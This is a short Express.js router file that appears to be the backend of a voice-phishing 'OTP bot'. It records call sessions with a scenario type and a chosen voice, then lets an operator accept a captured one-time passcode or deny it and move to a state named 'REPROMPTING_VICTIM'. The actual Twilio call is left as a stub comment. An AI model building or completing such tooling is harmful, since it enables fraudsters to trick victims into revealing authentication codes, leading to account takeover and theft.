import express from 'express';
import twilio from 'twilio';

export const router = express.Router();

const activeCallSessions = new Map();

router.post('/initiate', (req, res) => {
  const { scenarioType, selectedVoiceId, ...callParams } = req.body;
  
  const callId = `call_${Date.now()}_${Math.random().toString(36).substring(2, 10)}`;
  
  activeCallSessions.set(callId, {
    scenarioType,
    selectedVoiceId,
    params: callParams,
    status: 'INITIATING'
  });

  // Here you would integrate with Twilio to make the actual call
  // For now, we'll simulate success
  res.json({
    success: true,
    message: 'Call initiated successfully',
    callId,
    initialUiState: 'OTP_PENDING_USER_VALIDATION'
  });
});

router.post('/otp-decision', (req, res) => {
  const { callId, decision, otpValue } = req.body;
  
  const session = activeCallSessions.get(callId);
  if (!session) {
    return res.status(404).json({ error: 'Call session not found' });
  }

  if (decision === 'accept') {
    res.json({
      success: true,
      message: 'OTP accepted',
      nextUiState: 'COMPLETED'
    });
  } else {
    res.json({
      success: true,
      message: 'OTP denied, reprompting...',
      nextUiState: 'REPROMPTING_VICTIM'
    });
  }
});